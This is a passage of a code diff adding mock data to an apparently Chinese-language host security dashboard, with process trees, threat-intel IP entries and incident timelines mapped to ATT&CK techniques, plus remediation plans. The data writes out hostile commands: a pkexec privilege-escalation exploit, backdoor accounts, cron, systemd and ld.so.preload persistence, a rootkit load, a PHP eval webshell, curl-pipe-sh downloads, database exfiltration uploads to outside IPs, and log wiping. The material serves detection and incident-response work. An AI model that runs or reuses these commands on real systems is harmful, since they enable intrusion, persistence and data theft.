+        w110: ['grep', 23120, 'w33', 'www-data', 'grep -r DB_PASS /var/www', '已签名 · Debian', '—', '10:03:20'],
+        w111: ['grep', 23121, 'w33', 'www-data', 'grep -r password /etc', '已签名 · Debian', '—', '10:03:26'],
+        w112: ['grep', 23122, 'w33', 'www-data', 'grep -i ssh /etc/hosts', '已签名 · Debian', '—', '10:03:32'],
+        w113: ['grep', 23123, 'w33', 'www-data', 'grep sudo /etc/group', '已签名 · Debian', '—', '10:03:38'],
+        w114: ['awk', 23124, 'w33', 'www-data', 'awk -F: \'{print $1}\' /etc/passwd', '已签名 · Debian', '—', '10:03:44'],
+        w115: ['awk', 23125, 'w33', 'www-data', 'awk \'/inet /{print $2}\'', '已签名 · Debian', '—', '10:03:50'],
+        w116: ['awk', 23126, 'w33', 'www-data', 'awk \'{print $4}\' /proc/net/arp', '已签名 · Debian', '—', '10:03:56'],
+        w40: ['find', 23140, 'w33', 'www-data', 'find / -perm -4000 -type f 2>/dev/null', '已签名 · Debian', '—', '10:04:10'],
+        w41: ['cat', 23141, 'w33', 'www-data', 'cat /etc/passwd', '已签名 · Debian', '—', '10:04:14'],
+        w34: ['pkexec', 23150, 'w33', 'www-data', '/usr/bin/pkexec --version; ./cve-2021-4034', '已签名 · Debian', '—', '10:05:10'],
+        w35: ['bash', 23151, 'w34', 'root', 'bash -p', '已签名 · Debian', '—', '10:05:11'],
+        w50: ['cat', 23210, 'w35', 'root', 'cat /etc/shadow', '已签名 · Debian', '—', '10:05:20'],
+        w51: ['useradd', 23211, 'w35', 'root', 'useradd -o -u 0 -g 0 -M sysadm', '已签名 · Debian', '—', '10:06:30'],
+        w52: ['tee', 23212, 'w35', 'root', 'tee -a /root/.ssh/authorized_keys', '已签名 · Debian', '—', '10:07:40'],
+        w53: ['crontab', 23213, 'w35', 'root', '(crontab -l;echo "@reboot /usr/lib/.dbus/helper")|crontab -', '已签名 · Debian', '—', '10:08:50'],
+        w54: ['systemctl', 23214, 'w35', 'root', 'systemctl enable --now dbus-helper.service', '已签名 · Debian', '—', '10:10:00'],
+        w55: ['sh', 23215, 'w35', 'root', 'sh -c "echo /usr/lib/.dbus/libc.so > /etc/ld.so.preload"', '已签名 · Debian', '—', '10:11:10'],
+        w56: ['insmod', 23216, 'w35', 'root', 'insmod /tmp/.k/diamorphine.ko', '无签名', '8d1f…a7c2', '10:12:20'],
+        w57: ['iptables', 23217, 'w35', 'root', 'iptables -F', '已签名 · Debian', '—', '10:13:30'],
+        w60: ['wget', 23220, 'w35', 'root', 'wget -q 103.75.**.9/fscan -O /tmp/.k/fscan', '已签名 · Debian', '—', '10:14:40'],
+        w61: ['fscan', 23221, 'w35', 'root', '/tmp/.k/fscan -h 10.0.1.0/24 -np', '无签名', '8d1f…a7c2', '10:15:50'],
+        w130: ['ping', 23300, 'w61', 'root', 'ping -c1 -W1 10.0.1.11', '已签名 · Debian', '—', '10:16:00'],
+        w131: ['ping', 23301, 'w61', 'root', 'ping -c1 -W1 10.0.1.12', '已签名 · Debian', '—', '10:16:01'],
+        w132: ['ping', 23302, 'w61', 'root', 'ping -c1 -W1 10.0.1.13', '已签名 · Debian', '—', '10:16:02'],
+        w133: ['ping', 23303, 'w61', 'root', 'ping -c1 -W1 10.0.1.14', '已签名 · Debian', '—', '10:16:03'],
+        w134: ['ping', 23304, 'w61', 'root', 'ping -c1 -W1 10.0.1.15', '已签名 · Debian', '—', '10:16:04'],
+        w135: ['ping', 23305, 'w61', 'root', 'ping -c1 -W1 10.0.1.16', '已签名 · Debian', '—', '10:16:05'],
+        w136: ['ping', 23306, 'w61', 'root', 'ping -c1 -W1 10.0.1.17', '已签名 · Debian', '—', '10:16:06'],
+        w137: ['ping', 23307, 'w61', 'root', 'ping -c1 -W1 10.0.1.18', '已签名 · Debian', '—', '10:16:07'],
+        w138: ['ping', 23308, 'w61', 'root', 'ping -c1 -W1 10.0.1.19', '已签名 · Debian', '—', '10:16:08'],
+        w139: ['ping', 23309, 'w61', 'root', 'ping -c1 -W1 10.0.1.20', '已签名 · Debian', '—', '10:16:09'],
+        w140: ['ping', 23310, 'w61', 'root', 'ping -c1 -W1 10.0.1.21', '已签名 · Debian', '—', '10:16:10'],
+        w141: ['ping', 23311, 'w61', 'root', 'ping -c1 -W1 10.0.1.22', '已签名 · Debian', '—', '10:16:11'],
+        w62: ['mysqldump', 23222, 'w35', 'root', 'mysqldump -uroot -p*** --all-databases', '已签名 · Debian', '—', '10:17:00'],
+        w63: ['tar', 23223, 'w35', 'root', 'tar czf /tmp/.k/w.tgz /var/www /tmp/.k/all.sql', '已签名 · Debian', '—', '10:18:10'],
+        w64: ['curl', 23224, 'w35', 'root', 'curl -T /tmp/.k/w.tgz 103.75.**.9:8080/u', '已签名 · Debian', '—', '10:19:20'],
+        w58: ['bash', 23218, 'w35', 'root', 'bash -c "history -c; unset HISTFILE"', '已签名 · Debian', '—', '10:20:30'],
+        w59: ['rm', 23219, 'w35', 'root', 'rm -f /var/log/auth.log /var/log/nginx/access.log', '已签名 · Debian', '—', '10:21:40'],
+        w150: ['ls', 23400, 'w35', 'root', 'ls -la /root', '已签名 · Debian', '—', '10:05:15'],
+        w151: ['ls', 23401, 'w35', 'root', 'ls /etc/cron.d', '已签名 · Debian', '—', '10:05:55'],
+        w152: ['ls', 23402, 'w35', 'root', 'ls /tmp/.k', '已签名 · Debian', '—', '10:06:35'],
+        w153: ['ls', 23403, 'w35', 'root', 'ls -la /usr/lib/.dbus', '已签名 · Debian', '—', '10:07:15'],
+        w154: ['cat', 23404, 'w35', 'root', 'cat /etc/hosts', '已签名 · Debian', '—', '10:07:55'],
+        w155: ['cat', 23405, 'w35', 'root', 'cat /root/.bash_history', '已签名 · Debian', '—', '10:08:35'],
+        w156: ['cat', 23406, 'w35', 'root', 'cat ~/.my.cnf', '已签名 · Debian', '—', '10:09:15'],
+        w157: ['sleep', 23407, 'w35', 'root', 'sleep 30', '已签名 · Debian', '—', '10:09:55'],
+        w158: ['sleep', 23408, 'w35', 'root', 'sleep 30', '已签名 · Debian', '—', '10:10:35'],
+        w159: ['sleep', 23409, 'w35', 'root', 'sleep 60', '已签名 · Debian', '—', '10:11:15'],
+        w160: ['sleep', 23410, 'w35', 'root', 'sleep 60', '已签名 · Debian', '—', '10:11:55'],
+        w161: ['curl', 23411, 'w35', 'root', 'curl -s ifconfig.me', '已签名 · Debian', '—', '10:12:35'],
+        w162: ['curl', 23412, 'w35', 'root', 'curl -sI 10.0.1.12', '已签名 · Debian', '—', '10:13:15'],
+        w163: ['curl', 23413, 'w35', 'root', 'curl -sI 10.0.1.13', '已签名 · Debian', '—', '10:13:55'],
+        w164: ['chmod', 23414, 'w35', 'root', 'chmod +x /tmp/.k/fscan', '已签名 · Debian', '—', '10:14:35'],
+        w165: ['mkdir', 23415, 'w35', 'root', 'mkdir -p /tmp/.k', '已签名 · Debian', '—', '10:15:15'],
+        w36: ['ssh', 23500, 'w35', 'root', 'ssh -i /tmp/.k/id root@10.0.1.12', '已签名 · Debian', '—', '10:30:20'],
+        w37: ['ssh', 23501, 'w35', 'root', 'ssh -i /tmp/.k/id root@10.0.1.13', '已签名 · Debian', '—', '10:31:20'],
+        w170: ['ssh', 23510, 'w35', 'root', 'ssh -o BatchMode=yes root@10.0.1.14 true', '已签名 · Debian', '—', '10:28:40'],
+        w171: ['ssh', 23511, 'w35', 'root', 'ssh -o BatchMode=yes root@10.0.1.15 true', '已签名 · Debian', '—', '10:29:00'],
+        w172: ['ssh', 23512, 'w35', 'root', 'ssh -o BatchMode=yes root@10.0.1.16 true', '已签名 · Debian', '—', '10:29:20'],
+        w173: ['ssh', 23513, 'w35', 'root', 'ssh -o BatchMode=yes root@10.0.1.17 true', '已签名 · Debian', '—', '10:29:40'],
+        w174: ['ssh', 23514, 'w35', 'root', 'ssh -o BatchMode=yes root@10.0.1.18 true', '已签名 · Debian', '—', '10:30:00'],
+        z1: ['sshd', 31000, '', 'deploy', 'sshd: deploy [priv]', '已签名 · Debian', '—', '00:12:03'],
+        z2: ['bash', 31001, 'z1', 'deploy', '-bash', '已签名 · Debian', '—', '00:12:04'],
+        z3: ['sudo', 31002, 'z2', 'deploy', 'sudo -i', '已签名 · Debian', '—', '00:12:05'],
+        z4: ['bash', 31003, 'z3', 'root', '-bash', '已签名 · Debian', '—', '00:12:06'],
+        z5: ['sh', 31004, 'z4', 'root', 'sh /opt/ops/healthcheck.sh', '已签名 · Debian', '—', '00:12:07'],
+        z6: ['python3.11-ops-healthcheck-agent', 31005, 'z5', 'root', '/opt/ops/venv/bin/python3.11 /opt/ops/healthcheck_agent.py --interval 30 --report https://ops.internal/api/v1/report', '已签名 · Debian', '—', '00:12:08'],
+        z7: ['sh', 31006, 'z6', 'root', 'sh -c "cd /var/cache/.fonts && ./u"', '已签名 · Debian', '—', '00:12:09'],
+        z8: ['bash', 31007, 'z7', 'root', 'bash ./u', '已签名 · Debian', '—', '00:12:10'],
+        z9: ['nohup', 31008, 'z8', 'root', 'nohup ./x86_64-linux-gnu-update-notifier-helper &', '已签名 · Debian', '—', '00:12:11'],
+        z10: ['x86_64-linux-gnu-update-notifier-helper', 31009, 'z9', 'root', '/var/cache/.fonts/x86_64-linux-gnu-update-notifier-helper --daemon --pid /run/.un.pid', '无签名', 'f0c1…9e2d', '00:12:12'],
+        z11: ['sh', 31010, 'z10', 'root', 'sh -c "exec perl -e ..."', '已签名 · Debian', '—', '00:12:13'],
+        z12: ['perl', 31011, 'z11', 'root', 'perl -e \'$0="[kworker/u16:2-events_power_efficient]";exec("/var/cache/.fonts/.k")\'', '已签名 · Debian', '—', '00:12:14'],
+        z13: ['bash', 31012, 'z12', 'root', 'bash -c /var/cache/.fonts/.k', '已签名 · Debian', '—', '00:12:15'],
+        z14: ['ld-linux-x86-64.so.2', 31013, 'z13', 'root', '/lib64/ld-linux-x86-64.so.2 /var/cache/.fonts/.k', '无签名', 'f0c1…9e2d', '00:12:16'],
+        z15: ['[kworker/u16:2-events_power_efficient]', 31014, 'z14', 'root', '[kworker/u16:2-events_power_efficient]', '无签名', 'f0c1…9e2d', '00:12:17'],
+        z16: ['curl', 31015, 'z15', 'root', 'curl -s -m 5 https://cdn-update.**.top/beacon?id=api-01', '已签名 · Debian', '—', '00:12:18'],
+        z40: ['systemd-tmpfiles-clean-and-rotate-journal-helper', 31100, 'z4', 'root', '/usr/lib/systemd/systemd-tmpfiles-clean-and-rotate-journal-helper --boot --prefix=/var/log/journal/00', '已签名 · Debian', '—', '02:00:00'],
+        z41: ['systemd-tmpfiles-clean-and-rotate-journal-helper', 31101, 'z4', 'root', '/usr/lib/systemd/systemd-tmpfiles-clean-and-rotate-journal-helper --boot --prefix=/var/log/journal/01', '已签名 · Debian', '—', '04:00:00'],
+        z42: ['systemd-tmpfiles-clean-and-rotate-journal-helper', 31102, 'z4', 'root', '/usr/lib/systemd/systemd-tmpfiles-clean-and-rotate-journal-helper --boot --prefix=/var/log/journal/02', '已签名 · Debian', '—', '06:00:00'],
+        z43: ['systemd-tmpfiles-clean-and-rotate-journal-helper', 31103, 'z4', 'root', '/usr/lib/systemd/systemd-tmpfiles-clean-and-rotate-journal-helper --boot --prefix=/var/log/journal/03', '已签名 · Debian', '—', '08:00:00'],
+        z44: ['systemd-tmpfiles-clean-and-rotate-journal-helper', 31104, 'z4', 'root', '/usr/lib/systemd/systemd-tmpfiles-clean-and-rotate-journal-helper --boot --prefix=/var/log/journal/04', '已签名 · Debian', '—', '10:00:00'],
+        z45: ['systemd-tmpfiles-clean-and-rotate-journal-helper', 31105, 'z4', 'root', '/usr/lib/systemd/systemd-tmpfiles-clean-and-rotate-journal-helper --boot --prefix=/var/log/journal/05', '已签名 · Debian', '—', '12:00:00'],
+        z46: ['systemd-tmpfiles-clean-and-rotate-journal-helper', 31106, 'z4', 'root', '/usr/lib/systemd/systemd-tmpfiles-clean-and-rotate-journal-helper --boot --prefix=/var/log/journal/06', '已签名 · Debian', '—', '14:00:00'],
+        z47: ['systemd-tmpfiles-clean-and-rotate-journal-helper', 31107, 'z4', 'root', '/usr/lib/systemd/systemd-tmpfiles-clean-and-rotate-journal-helper --boot --prefix=/var/log/journal/07', '已签名 · Debian', '—', '16:00:00'],
+        z48: ['systemd-tmpfiles-clean-and-rotate-journal-helper', 31108, 'z4', 'root', '/usr/lib/systemd/systemd-tmpfiles-clean-and-rotate-journal-helper --boot --prefix=/var/log/journal/08', '已签名 · Debian', '—', '18:00:00'] };
       const OTHER = { src: ['ip', '攻击源', '43.21.88.17', [['IP', '43.21.88.17'], ['归属', '境外 · 荷兰'], ['情报', '已知扫描器，近 7 天 312 次']]],
         up: ['evt', 'WebShell 上传', 'POST /upload', [['请求', 'POST /upload'], ['落地文件', '/tmp/shell.php'], ['响应', '200 · 1.2KB']], '请求体摘要', 'filename="shell.php" <?php @eval($_POST[...]); ?>'],
         f1: ['file', 'kworkerd', '/tmp/.x/kworkerd', [['路径', '/tmp/.x/kworkerd'], ['大小', '1.8MB'], ['SHA256', 'e07a…9c21', 'pi-mono'], ['情报', '远控木马家族 · 高置信', 'hd-red']]],
         c2: ['ip', '外联地址', '185.66.21.9:443', [['IP', '185.66.21.9'], ['归属', '境外 · 新加坡'], ['情报', 'C2 服务器 · 高置信', 'hd-red'], ['连接', '持续 17 分钟，上行 38.2MB']]],
         s2: ['ip', '攻击源', '61.177.**.20', [['IP', '61.177.**.20'], ['归属', '江苏 · 电信'], ['情报', '暴力破解源，近 24 小时 312 次失败']]],
         x2: ['ip', '下载地址', '45.13.**.8', [['IP', '45.13.**.8'], ['归属', '境外 · 德国'], ['情报', '恶意脚本分发 · 中置信']]],
-        s3: ['ip', '攻击源', '222.186.**.71', [['IP', '222.186.**.71'], ['归属', '江苏 · 电信'], ['情报', '暴力破解源']]] };
+        s3: ['ip', '攻击源', '222.186.**.71', [['IP', '222.186.**.71'], ['归属', '江苏 · 电信'], ['情报', '暴力破解源']]],
+        x7: ['ip', '下载地址', '91.215.**.4', [['IP', '91.215.**.4'], ['归属', '境外 · 俄罗斯'], ['情报', '挖矿木马分发 · 高置信', 'hd-red']]],
+        n7: ['ip', '横向目标', '10.0.2.31:22', [['IP', '10.0.2.31'], ['主机', 'app-04（同网段）'], ['结果', 'SSH 登录成功，已执行下载命令', 'hd-red']]],
+        x9: ['ip', '攻击源', '103.75.**.9', [['IP', '103.75.**.9'], ['归属', '境外 · 新加坡'], ['情报', 'WebShell 投递 / 回连 · 高置信', 'hd-red']]],
+        n9: ['ip', '横向目标', '10.0.1.12:22', [['IP', '10.0.1.12'], ['主机', 'web-prod-02（同网段）'], ['结果', 'SSH 登录成功，另有 10.0.1.13 也被登录', 'hd-red']]],
+        x10: ['ip', '外联地址', 'cdn-update.**.top', [['域名', 'cdn-update.**.top'], ['解析', '45.137.**.21 · 境外'], ['情报', '后门回连 · 中置信', 'hd-red']]] };
       const HOSTN = (hn) => ['host', '受害主机', (HM[hn] || {}).ip || '', [['主机', hn], ['IP', (HM[hn] || {}).ip || ''], ['客户端', ((HM[hn] || {}).ver || '') + ' · ' + ((HM[hn] || {}).on || '在线')]]];
       const INC = [
         { id: 'INC-3201', n: 'WebShell 植入并反弹连接', lv: '高危', h: 'web-prod-01', st0: '待研判', tm: '09:12', entry: 'WebShell 上传', first: '09:12:05', last: '09:17:44',
@@ -2519,6 +3123,23 @@ class Component extends DCLogic {
           ai: ['09:13', '需要人工确认', '64%', 'Java 应用进程派生 sh，执行了一段 base64 编码的命令，解码后是从 45.13.**.8 下载脚本。', ['应用进程派生 Shell 不常见，但部分运维脚本也会这么做', '下载地址命中中置信度情报']],
           main: ['host', 'j1', 'j2', 'j3', 'x2'], br: [], al: [['d1', '09:12:30', '编码命令执行', '执行', 'T1027 混淆命令', 'echo Y3Vyb…| base64 -d | sh', 'j2'], ['d2', '09:12:31', '下载脚本', '执行', 'T1105 入口工具传输', 'curl 45.13.**.8/x.sh', 'j3']],
           plan: ['先确认这段命令是否来自运维脚本。如果不是，终止 sh（5520）并封禁 45.13.**.8。', [['终止进程树', 'sh · PID 5520', ''], ['封禁 IP', '45.13.**.8', '']]], recs: [] },
+        { id: 'INC-3207', n: '计划任务被篡改并运行挖矿程序', lv: '高危', h: 'app-03', st0: '待研判', tm: '09:41', entry: '计划任务被篡改', first: '09:41:02', last: '09:48:30',
+          ai: ['09:49', '确认入侵', '95%', 'root 的计划任务被改成定时下载执行脚本，脚本批量拉取 40 个载荷分片、清空防火墙、运行挖矿程序 kdevd，并通过 SSH 横向到 10.0.2.31。', ['up.sh 命中挖矿家族 Kinsing 变种特征', 'kdevd 无签名，CPU 占用 780%']],
+          main: ['x7', 'host', 'q1', 'q2', 'q3', 'q5', 'q6', 'q9', 'n7'], br: ['q10', 'q11', 'q12', 'q13', 'q14', 'q15', 'q16', 'q17', 'q18', 'q19', 'q20', 'q21', 'q22', 'q23', 'q24', 'q25', 'q26', 'q27', 'q28', 'q29', 'q30', 'q31', 'q32', 'q33', 'q34', 'q35', 'q36', 'q37', 'q38', 'q39', 'q40', 'q41', 'q42', 'q43', 'q44', 'q45', 'q46', 'q47', 'q48', 'q49', 'q4', 'q8', 'q7', 'q60', 'q61', 'q62', 'q63', 'q64', 'q65', 'q66', 'q67', 'q91', 'q70', 'q71', 'q72'], brAt: 'q3',
+          al: [['h1', '09:41:02', '计划任务执行远程脚本', '执行', 'T1053.003 Cron', 'sh -c "curl -fsSL 91.215.**.4/up.sh | sh"', 'q2'], ['h2', '09:41:05', '批量下载载荷', '执行', 'T1105 入口工具传输', '40 次 curl 下载 /var/tmp/.u/p00–p39', 'q10'],
+            ['h3', '09:44:03', '清空防火墙规则', '防御规避', 'T1562.004 禁用防火墙', 'iptables -F', 'q7'], ['h4', '09:44:05', '挖矿程序运行', '影响', 'T1496 资源劫持', 'kdevd 连接 pool.**:3333，CPU 占用 780%', 'q5'],
+            ['h5', '09:44:20', '写入计划任务', '持久化', 'T1053.003 Cron', '*/10 * * * * curl -fsSL 91.215.**.4/up.sh|sh', 'q6'], ['h6', '09:48:30', 'SSH 横向移动', '横向移动', 'T1021.004 SSH', 'ssh root@10.0.2.31 执行下载命令', 'q9']],
+          plan: ['终止 bash（9102）进程树和 kdevd，删除被篡改的 root 计划任务，封禁 91.215.**.4，并检查 10.0.2.31。', [['终止恶意进程树', 'bash · PID 9102', ''], ['清除持久化', 'root crontab 第 2 行', '只终止进程的话，载荷会被计划任务再次拉起'], ['封禁 IP', '91.215.**.4', ''], ['隔离落地文件', '/var/tmp/.u/（41 个文件）', '']]], recs: [] },
+        { id: 'INC-3212', n: 'Web 应用被入侵后提权并横向扩散', lv: '高危', h: 'web-prod-01', st0: '待研判', tm: '10:02', entry: 'WebShell 上传', first: '10:02:11', last: '10:31:20',
+          ai: ['10:32', '确认入侵', '97%', '攻击者通过上传的 WebShell 拿到 www-data 权限，反弹 Shell 后利用 pkexec 提权到 root，随后建立 5 种持久化、加载 rootkit、导出并外传数据库，最后用窃取的密钥 SSH 登录了 2 台同网段主机。', ['ico.php 命中 WebShell 特征', '22 条告警覆盖 8 个 ATT&CK 阶段，同一条进程链']],
+          main: ['x9', 'host', 'w10', 'w11', 'w31', 'w32', 'w33', 'w34', 'w35', 'w36', 'n9'], br: ['w12', 'w13', 'w14', 'w15', 'w16', 'w17', 'w18', 'w19', 'w20', 'w21', 'w22', 'w23', 'w24', 'w25', 'w26', 'w27', 'w28', 'w29', 'w30', 'w100', 'w101', 'w102', 'w103', 'w104', 'w105', 'w106', 'w107', 'w108', 'w109', 'w110', 'w111', 'w112', 'w113', 'w114', 'w115', 'w116', 'w40', 'w41', 'w50', 'w51', 'w52', 'w53', 'w54', 'w55', 'w56', 'w57', 'w60', 'w61', 'w130', 'w131', 'w132', 'w133', 'w134', 'w135', 'w136', 'w137', 'w138', 'w139', 'w140', 'w141', 'w62', 'w63', 'w64', 'w58', 'w59', 'w150', 'w151', 'w152', 'w153', 'w154', 'w155', 'w156', 'w157', 'w158', 'w159', 'w160', 'w161', 'w162', 'w163', 'w164', 'w165', 'w37', 'w170', 'w171', 'w172', 'w173', 'w174'], brAt: 'w35',
+          al: [['k1', '10:02:11', 'WebShell 执行命令', '执行', 'T1505.003 WebShell', 'upload/ico.php 调用 system() 执行 sh', 'w31'], ['k2', '10:02:12', '反弹 Shell', '执行', 'T1059.006 Python', 'python3 反连 103.75.**.9:443', 'w32'], ['k3', '10:04:10', 'SUID 文件枚举', '发现', 'T1083 文件与目录发现', 'find / -perm -4000', 'w40'], ['k4', '10:04:14', '读取账户信息', '发现', 'T1087.001 本地账户', 'cat /etc/passwd', 'w41'], ['k5', '10:05:10', '本地提权', '权限提升', 'T1068 漏洞利用提权', 'pkexec（CVE-2021-4034）获得 root', 'w34'], ['k6', '10:05:20', '读取密码哈希', '凭据访问', 'T1003.008 /etc/shadow', 'cat /etc/shadow', 'w50'], ['k7', '10:06:30', '新建特权账号', '持久化', 'T1136.001 本地账户', 'useradd -o -u 0 sysadm', 'w51'], ['k8', '10:07:40', '写入 SSH 公钥', '持久化', 'T1098.004 SSH 公钥', '/root/.ssh/authorized_keys 新增 1 行', 'w52'], ['k9', '10:08:50', '写入计划任务', '持久化', 'T1053.003 Cron', '@reboot /usr/lib/.dbus/helper', 'w53'], ['k10', '10:10:00', '创建系统服务', '持久化', 'T1543.002 Systemd 服务', 'dbus-helper.service', 'w54'], ['k11', '10:11:10', '劫持动态链接', '防御规避', 'T1574.006 动态链接劫持', '/etc/ld.so.preload 被写入', 'w55'], ['k12', '10:12:20', '加载内核模块', '防御规避', 'T1014 Rootkit', 'diamorphine.ko', 'w56'], ['k13', '10:13:30', '清空防火墙规则', '防御规避', 'T1562.004 禁用防火墙', 'iptables -F', 'w57'], ['k14', '10:14:40', '下载攻击工具', '执行', 'T1105 入口工具传输', 'wget 103.75.**.9/fscan', 'w60'], ['k15', '10:15:50', '内网扫描', '发现', 'T1046 网络服务发现', 'fscan 扫描 10.0.1.0/24', 'w61'], ['k16', '10:17:00', '导出数据库', '收集', 'T1005 本地数据', 'mysqldump --all-databases', 'w62'], ['k17', '10:18:10', '打包敏感数据', '收集', 'T1560.001 归档', '/tmp/.k/w.tgz 214MB', 'w63'], ['k18', '10:19:20', '数据外传', '数据外传', 'T1048 非 C2 协议外传', '上传 214MB 到 103.75.**.9', 'w64'], ['k19', '10:20:30', '清除命令历史', '防御规避', 'T1070.003 清除历史', 'history -c', 'w58'], ['k20', '10:21:40', '删除日志', '防御规避', 'T1070.002 清除系统日志', 'rm /var/log/auth.log', 'w59'], ['k21', '10:30:20', 'SSH 横向移动', '横向移动', 'T1021.004 SSH', 'ssh root@10.0.1.12 成功', 'w36'], ['k22', '10:31:20', 'SSH 横向移动', '横向移动', 'T1021.004 SSH', 'ssh root@10.0.1.13 成功', 'w37']],
+          plan: ['立即隔离 web-prod-01，终止 php-fpm 派生的进程树，清除 5 处持久化和 rootkit，封禁 103.75.**.9，并排查 10.0.1.12 / 10.0.1.13。', [['隔离主机', 'web-prod-01', '先断网，避免继续横向'], ['终止恶意进程树', 'sh · PID 23101', ''], ['清除持久化', 'sysadm 账号、authorized_keys、crontab、dbus-helper 服务、ld.so.preload', ''], ['封禁 IP', '103.75.**.9', ''], ['删除 WebShell', '/var/www/html/upload/ico.php', '']]], recs: [] },
+        { id: 'INC-3213', n: '后门伪装成内核线程并全天定时外联', lv: '高危', h: 'api-01', st0: '待研判', tm: '00:12', entry: '运维脚本被替换', first: '00:12:05', last: '23:42:05',
+          ai: ['23:43', '确认入侵', '91%', '运维账号的健康检查脚本被替换，经过 16 层进程链拉起无签名程序，并把进程名伪装成内核线程，全天定时向 cdn-update.**.top 外联共 40 次。', ['进程链层级异常深，用来躲避父子关系检测', '外联有固定间隔，凌晨 3 点出现一次密集外联']],
+          main: ['host', 'z1', 'z2', 'z3', 'z4', 'z5', 'z6', 'z7', 'z8', 'z9', 'z10', 'z11', 'z12', 'z13', 'z14', 'z15', 'z16', 'x10'], br: ['z40', 'z41', 'z42', 'z43', 'z44', 'z45', 'z46', 'z47', 'z48'], brAt: 'z4',
+          al: [['m1', '00:12:05', '运维脚本被替换', '执行', 'T1059.004 Unix Shell', 'healthcheck.sh 派生 sh 执行 /var/cache/.fonts/u', 'z7'], ['b1', '00:12:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['m2', '00:12:11', '进程名伪装', '防御规避', 'T1036.004 伪装任务或服务', 'perl 把进程名改成 [kworker/u16:2-events_power_efficient]', 'z12'], ['m3', '00:12:13', '无签名程序驻留', '持久化', 'T1543 创建或修改系统进程', '/var/cache/.fonts/.k 常驻运行', 'z15'], ['b2', '00:15:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b3', '00:18:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b4', '00:21:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b5', '00:24:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b6', '00:27:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b7', '00:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b8', '00:33:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b9', '00:36:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b10', '00:39:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b11', '01:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b23', '03:00:00', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b24', '03:00:04', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b25', '03:00:08', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b26', '03:00:12', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b27', '03:00:16', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b28', '03:00:20', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b29', '03:00:24', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b30', '03:00:28', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b31', '03:00:32', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b32', '03:00:36', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b33', '03:00:40', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b34', '03:00:44', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b35', '03:00:48', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b36', '03:00:52', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b37', '03:00:56', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b12', '03:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b13', '05:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b14', '07:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b15', '09:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b16', '11:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b17', '13:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b18', '15:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b19', '17:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b20', '19:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b21', '21:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b22', '23:30:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b38', '23:40:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 